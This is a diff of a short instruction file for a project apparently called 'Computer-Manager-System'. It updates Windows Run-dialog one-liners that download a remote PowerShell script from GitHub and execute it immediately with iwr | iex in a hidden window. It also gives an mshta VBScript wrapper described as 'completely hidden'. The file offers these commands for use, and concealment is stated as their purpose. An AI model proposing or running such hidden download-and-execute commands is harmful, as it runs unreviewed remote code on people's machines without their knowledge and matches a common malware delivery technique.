@@ -1,7 +1,9 @@
-Windows Run Dialog (Win+R) One-Liner (Hidden Window):
+Windows Run Dialog (Win+R) One-Liner (Hidden Window) - EXE Version (No Python Required):
 
-powershell -WindowStyle Hidden -c "iwr https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/install.ps1 -UseBasicParsing | iex"
+powershell -WindowStyle Hidden -c "iwr https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/install-exe.ps1 -UseBasicParsing | iex"
 
 Or with VBScript wrapper (completely hidden):
 
-mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -WindowStyle Hidden -c """"iwr https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/install.ps1 -UseBasicParsing | iex"""""",0:Close")
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -WindowStyle Hidden -c """"iwr https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/install-exe.ps1 -UseBasicParsing | iex"""""",0:Close")
+
+Note: The exe must be built and released on GitHub first. Run the GitHub Actions workflow to build it.
